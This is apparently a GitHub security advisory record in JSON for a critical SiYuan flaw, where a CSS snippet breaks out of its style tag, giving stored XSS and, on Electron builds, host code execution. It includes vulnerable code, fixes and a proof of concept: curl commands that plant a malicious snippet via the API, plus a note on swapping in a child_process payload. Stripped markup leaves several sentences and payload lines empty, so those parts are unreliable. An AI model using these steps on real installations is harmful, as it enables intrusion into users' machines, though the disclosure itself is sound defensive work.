body_excerpt: {"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/146629145?v=4", "events_url": "https://api.github.com/users/hillalee/events{/privacy}", "followers_url": "https://api.github.com/users/hillalee/followers", "following_url": "https://api.github.com/users/hillalee/following{/other_user}", "gists_url": "https://api.github.com/users/hillalee/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/hillalee", "id": 146629145, "login": "hillalee", "node_id": "U_kgDOCL1iGQ", "organizations_url": "https://api.github.com/users/hillalee/orgs", "received_events_url": "https://api.github.com/users/hillalee/received_events", "repos_url": "https://api.github.com/users/hillalee/repos", "site_admin": false, "starred_url": "https://api.github.com/users/hillalee/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hillalee/subscriptions", "type": "User", "url": "https://api.github.com/users/hillalee", "user_view_type": "public"}}], "cve_id": "CVE-2026-54067", "cvss": {"score": 9.9, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 9.9, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-79", "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"}, {"cwe_id": "CWE-1188", "name": "Initialization of a Resource with an Insecure Default"}], "description": "### Summary A CSS snippet body containing `` breaks out of its surrounding `` runs arbitrary JavaScript in the renderer. On Electron desktop builds the renderer runs with `nodeIntegration:true`, so `require('child_process')` is reachable from the injected handler and the XSS chains to host RCE. Snippets sync via the workspace repository, so an attacker with write access to any synced workspace plants the payload once and it fires on every device that pulls. The bug also bypasses the user's `enabledCSS` / `enabledJS` separation. A user who turned `enabledJS` off was making a deliberate call not to run untrusted JavaScript; the CSS path runs it anyway. ### Details Affected: - HEAD `96dfe0b` (v3.6.5, 2026-04-21) - Sink: `app/src/config/util/snippets.ts:32` - Source: `/api/snippet/getSnippet`, backed by `data/snippets/conf.json` - Default config: `EnabledCSS: true`, `EnabledJS: true` at `kernel/conf/snippet.go:26-27` - Electron config: `nodeIntegration:true`, `contextIsolation:false`, `webSecurity:false` on every `BrowserWindow` in `app/electron/main.js:307,408-411,1107-1110,1150-1153,1322` The write path stores raw content. `kernel/api/snippet.go:107-130` copies `Content` from the request straight into the snippet record with no HTML escape, no `` check, no type-specific validation: ```go snippet := &conf.Snippet{ ID: m["id"].(string), Name: m["name"].(string), Type: m["type"].(string), Content: m["content"].(string), Enabled: m["enabled"].(bool), } ``` Storage is workspace-internal and syncs. `kernel/model/repository.go:1748,1798` reference `data/snippets/conf.json`, so the malicious record propagates to every sync peer. The renderer reads the snippet back through `/api/snippet/getSnippet` and interpolates it into a ``); } else if (item.type === "js") { // intentional script-loading path } }); }); ``` `${item.content}` lands inside the `` substring and treats anything after as a sibling of the empty `` in the body is a 4-character text node instead of a close tag. If touching that line is undesirable, the smaller patch is to escape `<` before interpolation: ```ts const safe = item.content.replace(/[&<]/g, c => c === "&" ? "&" : "<"); document.head.insertAdjacentHTML("beforeend", ``); ``` Either fix on its own closes the bug. Worth also rejecting `` on the `setSnippet` backend handler so older renderers pulling the same synced workspace stay safe. ### PoC Stand up SiYuan: ```bash docker run -d --name siyuan-poc \ -v ./workspace:/siyuan/workspace \ -p 16806:6806 \ b3log/siyuan:latest \ --workspace=/siyuan/workspace --accessAuthCode=hunter2 ``` Plant the snippet: ```bash TOKEN=$(jq -r '.api.token' workspace/conf/conf.json) curl -X POST http://localhost:16806/api/snippet/setSnippet \ -H "Content-Type: application/json" \ -H "Authorization: Token $TOKEN" \ -d '{"snippets":[{"id":"","name":"poc","type":"css","enabled":true,"content":""}]}' ``` Returns `{"code":0,"msg":"","data":null}`. The snippet now sits at `workspace/data/snippets/conf.json` verbatim. Open `http://localhost:16806/stage/build/desktop/?r=1` or the Electron app pointing at the same workspace, authenticate, and run in DevTools: ```js ({ markerFired: window.__siyuan_xss === true, styleCount: document.querySelectorAll('style[id^="snippetCSS"]').length, imgsInHead: document.head.querySelectorAll('img').length, snippetStyleEmpty: document.querySelector('style[id^="snippetCSS"]')?.textContent.length === 0 }) ``` Result from my run on 2026-05-19 against `b3log/siyuan:latest`: ```json { "markerFired": true, "styleCount": 1, "imgsInHead": 1, "snippetStyleEmpty": true } ``` `document.title` is `SIYUAN_XSS`. The ``. The smuggled `` is a sibling in ``. The injected `onerror` ran arbitrary JS. To turn it into RCE on Electron, swap the marker payload for: ```html ``` `require` is reachable from the renderer because of `nodeIntegration:true` in `app/electron/main.js:408`. ### Impact Stored XSS to RCE on Electron desktop builds, plus XSS on mobile and Docker web builds. The payload fires whenever the renderer refreshes snippets: on boot, on manual reload, or on a `reloadSnippet` WebSocket push. No user click required beyond having the app open. Anyone affected by a workspace-write compromise is exposed. Realistic paths in: compromised SiYuan Cloud / S3 / WebDAV sync credentials, a workspace folder mounted on a shared filesystem (Dropbox, Syncthing, network share, git), or a multi-user Docker server where any authenticated user can call `/api/snippet/setSnippet`. Once the malicious snippet is in the workspace, every peer that syncs and has `enabledCSS:true` runs the payload. The bug also silently bypasses the user's snippet-toggle intent. Someone who turned `enabledJS` off and left `enabledCSS` on was making a deliberate decision not to run untrusted JavaScript. The CSS path runs it anyway.", "epss": {"percentage": 0.00307, "percentile": 0.22509}, "ghsa_id": "GHSA-mvjr-vv3c-w4qv", "github_reviewed_at": "2026-07-10T19:25:09Z", "html_url": "https://github.com/advisories/GHSA-mvjr-vv3c-w4qv", "identifiers": [{"type": "GHSA", "value": "GHSA-mvjr-vv3c-w4qv"}, {"type": "CVE", "value": "CVE-2026-54067"}], "nvd_published_at": "2026-06-24T22:16:48Z", "published_at": "2026-07-10T19:25:09Z", "references": ["https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mvjr-vv3c-w4qv", "https://nvd.nist.gov/vuln/detail/CVE-2026-54067", "https://github.com/advisories/GHSA-mvjr-vv3c-w4qv"], "repository_advisory_url": "https://api.github.com/repos/siyuan-note/siyuan/security-advisories/GHSA-mvjr-vv3c-w4qv", "severity": "critical", "source_code_location": "https://github.com/siyuan-note/siyuan", "summary": "SiYuan: Stored XSS to RCE via CSS-snippet

title: SiYuan: Stored XSS to RCE via CSS-snippet <style> breakout in renderSnippet()
